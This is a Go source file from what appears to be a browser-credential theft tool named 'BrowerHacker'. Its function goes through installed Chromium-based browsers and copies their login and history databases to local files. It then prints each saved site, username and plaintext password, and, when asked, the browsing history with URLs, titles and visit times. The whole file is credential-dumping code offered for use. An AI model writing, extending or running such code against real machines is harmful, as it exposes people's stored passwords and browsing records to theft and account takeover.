package exec

import (
	"BrowerHacker/core"
	"fmt"
)

func ChromiumExecData(password,historys bool)error{
	for key,value := range core.ChromiumBrower{
		chromium, _ := value.BrowerInterface(value.BrowerName,value.BrowerProfilePath,value.BrowerKeyPath,value.BrowerHistory)
		err := chromium.CopyDBFileToLocal()
		if err != nil {
			//fmt.Println(err)
			continue
		}
		err = chromium.CopyHistoryToLocal()
		if err != nil {
			continue
		}
		data, err := chromium.ReturnMasterData()
		if err != nil {
			//fmt.Println(err)
			continue
		}
		history, err := chromium.ReturnHistoryData()
		if err != nil {
			fmt.Println(err)
			continue
		}


		if password == true{
			fmt.Println("[Brower]",key)
			for _, value := range data {
				fmt.Println("[+]",value.HostName)
				fmt.Println("[UserName]",value.UserName)
				fmt.Println("[Password]",value.PassWord)
				fmt.Println("")
			}
		}
		if historys == true {
			fmt.Println("[Brower]",key)
			for _,value := range history{
				fmt.Println("[Visit URL]", value.Url)
				fmt.Println("[Title]", value.Title)
				fmt.Println("[VisitCount]", value.VisitCount)
				fmt.Println("[LastVisitTime]", value.LastVisitTime)
				fmt.Println("")
			}
		}
		err = chromium.ReleaseDBToLocal()
		if err != nil {
			continue
		}
		err = chromium.ReleaseDBHistory()
		if err != nil {
			continue
		}
		fmt.Println("")
	}
	return nil
}
